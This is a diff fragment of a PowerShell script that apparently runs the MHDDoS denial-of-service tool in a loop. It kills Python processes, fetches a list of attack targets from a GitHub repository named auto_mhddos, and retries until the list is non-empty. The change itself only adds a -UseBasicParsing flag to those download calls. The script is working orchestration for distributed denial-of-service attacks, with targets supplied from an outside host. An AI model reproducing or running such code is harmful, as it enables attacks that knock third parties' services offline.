@@ -26,12 +26,12 @@ while($true){
     Stop-Process -Name "Python" -Force 
 
     # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.    
-    $targets = ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
+    $targets = ((Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
     Write-Output $('Number of targets in list: ' + $targets.Length) 
 
     while ($targets.Length -eq 0) {
         Start-Sleep(5)
-        $targets = ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
+        $targets = ((Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
         Write-Output $('Number of targets in list: ' + $targets.Length) 
     }
     
